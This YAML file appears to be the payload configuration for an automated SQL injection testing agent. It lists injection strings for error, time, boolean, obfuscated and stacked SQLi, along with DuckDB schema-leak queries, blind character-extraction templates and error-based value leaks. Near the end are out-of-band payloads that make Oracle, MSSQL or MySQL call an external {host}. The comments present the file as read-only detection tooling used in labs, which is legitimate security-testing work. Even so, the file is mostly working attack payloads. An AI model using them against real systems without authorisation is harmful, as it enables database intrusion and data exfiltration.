# SQL injection payloads — seed list for the SQLi agent
#
# Safety rules (enforced by agent):
#   - NO DROP, TRUNCATE, DELETE without WHERE, UPDATE without WHERE
#   - NO long SLEEP values (max 5s)
#   - Detection only: read-only SELECT, error triggers, boolean conditions

payloads:
  error_based:
    - "'"
    - "''"
    - "' OR '1'='1"
    - "' OR '1'='1'--"
    - "' OR 1=1--"
    - "\" OR \"1\"=\"1"
    - "1 AND 1=1"
    - "1 AND 1=2"
    - "1' AND '1'='1"
    - "1' AND '1'='2"
    - "') OR ('1'='1"

  time_based:
    # Order matters: the detector tries these in sequence under a per-endpoint
    # time budget, and each SLEEP probe costs a full ~5s. Put the RELIABLE
    # single-execution forms first.
    #   - `AND SLEEP(n)` runs the sleep ONCE (only for the matched row), giving a
    #     clean ~5s delay.
    #   - `OR SLEEP(n)` is evaluated for EVERY row the query scans, so on a table
    #     with several rows it multiplies to 5s*N and blows past the client read
    #     timeout — the probe is discarded and the budget wasted before the
    #     reliable payloads run. Keep it, but LAST.
    #   - Stacked `'; SELECT SLEEP(5)` does not execute on drivers that reject
    #     multi-statement queries (e.g. mysqli), so it is not a reliable primary.
    # MySQL — single-execution first
    - "1' AND SLEEP(5)-- -"
    - "1 AND SLEEP(5)-- -"
    - "' AND SLEEP(5)-- -"
    # MSSQL
    - "1; WAITFOR DELAY '0:0:5'-- -"
    - "'; WAITFOR DELAY '0:0:5'-- -"
    # PostgreSQL
    - "1'; SELECT pg_sleep(5)-- -"
    - "'; SELECT pg_sleep(5)-- -"
    # SQLite (no native sleep — uses heavy query as approximation)
    - "' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master m2, sqlite_master m3)>0 AND '1'='1"
    # Stacked / row-multiplied forms LAST (see note above)
    - "'; SELECT SLEEP(5)-- -"
    - "' OR SLEEP(5)-- -"

  boolean_based:
    - "' AND 1=1-- -"
    - "' AND 1=2-- -"
    - "1 AND 1=1-- -"
    - "1 AND 1=2-- -"
    - "' AND 'x'='x"
    - "' AND 'x'='y"

  obfuscation:
    - "' /*!OR*/ '1'='1"
    - "'/**/OR/**/'1'='1"
    - "' %4fR '1'='1"           # URL-encoded O
    - "' O%52 '1'='1"           # URL-encoded R
    - "1'%20AND%20'1'%3D'1"
    - "1' AND 0x31=0x31-- -"

  stacked:
    # Only try if single-quote variant confirmed injectable
    - "'; SELECT 1-- -"
    - "1; SELECT 1-- -"

  duckdb_version:
    # Read-only impact proof for a DuckDB-backed query: error(version()) embeds the version in a
    # DuckDB "Invalid Input Error: <version>" message (surfaced in a GraphQL errors[] message).
    # Detection-only — reads server metadata, no writes/stacked queries.
    - "x', (SELECT error(version())) as v, '"
    - "x', (SELECT error(version())) as v, '-- -"
    - "1', (SELECT error(version())) as v, '"

# Detection signatures (used by agent to classify responses)
error_signatures:
  - "you have an error in your sql syntax"
  - "unclosed quotation mark"
  - "quoted string not properly terminated"
  - "pg_query()"
  - "ORA-"
  - "Microsoft OLE DB Provider for SQL"
  - "Syntax error.*SQL"
  - "SQLiteException"
  - "SQLITE_ERROR"
  # SQLite / SQLAlchemy (Python, Flask, embedded, mobile) — the sqlite3 driver
  # and SQLAlchemy surface these when an injected quote breaks the query. Common
  # and previously unmatched (e.g. VAmPI's /users/v1/{username}).
  - "sqlite3.OperationalError"
  - "sqlite3.IntegrityError"
  - "sqlite3.ProgrammingError"
  - "sqlite3.DatabaseError"
  - "unrecognized token"
  - "SQL logic error"
  - "sqlalchemy.exc.OperationalError"
  - "sqlalchemy.exc.ProgrammingError"
  - "sql syntax.*near"
  - "near.*syntax error"
  - "warning.*mysql"
  - "PSQLException"
  - "com.mysql.jdbc"
  - "org.postgresql"
  - "System.Data.SqlClient"
  # DuckDB — its exception categories surface as "<Category> Error: ..." when an injected
  # quote breaks the query (seen on a DuckDB-backed reporting engine: a broken string field
  # leaked version() as "Invalid Input Error: <ver>"). Previously unmatched.
  - "Binder Error"
  - "Catalog Error"
  - "Conversion Error"
  - "Invalid Input Error"
  - "Parser Error"
  - "Out of Range Error"
  - "duckdb"

# Deterministic DuckDB impact facts (read-only metadata only — schema + counts, NEVER column
# values / PII). The sqli_probe tool wraps each inner SELECT in error(CONCAT('LABEL=', (...))) and
# parses the leaked value from the DuckDB error message. {table}/{where} are substituted by the
# tool from the target_table / scope_where args.
duckdb_fact_sql:
  tables: "SELECT string_agg(table_name, ',') FROM information_schema.tables"
  columns: "SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'"
  row_count: "SELECT CAST(COUNT(*) AS VARCHAR) FROM {table}"
  scoped_count: "SELECT CAST(COUNT(*) AS VARCHAR) FROM {table} WHERE {where}"

# Blind extraction comparison fragments (used by sqli_probe mode=blind_boolean / blind_time).
# {expr} = the read-only SELECT to exfiltrate, {pos} = 1-based char index, {n} = comparison
# operand. The tool substitutes these with str.replace, then drops the result into the caller's
# injection_template {cond} placeholder. Read-only — these only COMPARE a value, never write.
blind_extract:
  postgres:
    length: "LENGTH(({expr}))>{n}"
    char_gt: "ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))>{n}"
  mysql:
    length: "LENGTH(({expr}))>{n}"
    char_gt: "ASCII(SUBSTRING(({expr}),{pos},1))>{n}"
  mssql:
    length: "LEN(({expr}))>{n}"
    char_gt: "ASCII(SUBSTRING(({expr}),{pos},1))>{n}"
  oracle:
    length: "LENGTH(({expr}))>{n}"
    char_gt: "ASCII(SUBSTR(({expr}),{pos},1))>{n}"

# One-shot error-message leak expressions (sqli_probe mode=error_visible). {expr} is forced into
# a parseable error; the leaked value is pulled back with sqli_exploit's shared error parsers.
error_leak:
  postgres: "CAST(({expr}) AS int)"
  mysql: "extractvalue(1,concat(0x7e,({expr}),0x7e))"
  mssql: "CONVERT(int,({expr}))"
  oracle: "(SELECT to_number(({expr})) FROM dual)"

# Out-of-band egress payloads (sqli_probe mode=oast). {url} = full OOB callback URL, {host} = bare
# host[:port]. Oracle uses EXTRACTVALUE/XMLTYPE external-entity (XXE) DNS resolution — needs only
# DNS, no network ACL (UTL_HTTP.REQUEST requires a DBMS_NETWORK_ACL_ADMIN grant the DB usually
# lacks). MySQL LOAD_FILE egress is frequently blocked (secure_file_priv / Linux UNC).
# Oracle is the BARE extractvalue expression (no `(SELECT ... FROM dual)` wrapper): it slots into a
# UNION projection template (`' UNION SELECT {cond} FROM dual-- -` → the exact PortSwigger payload)
# and still works in a concat template. The wrapped scalar subquery executed but never fired the
# external-entity DNS fetch in the OOB lab; `FROM dual` now comes from the caller's template.
oast:
  oracle: "extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{host}/\"> %remote;]>'),'/l')"
  mssql: "exec master..xp_dirtree '//{host}/a'"
  mysql: "(SELECT LOAD_FILE(CONCAT('//', '{host}', '/a')))"

time_threshold_ms: 4500
max_sleep_seconds: 5
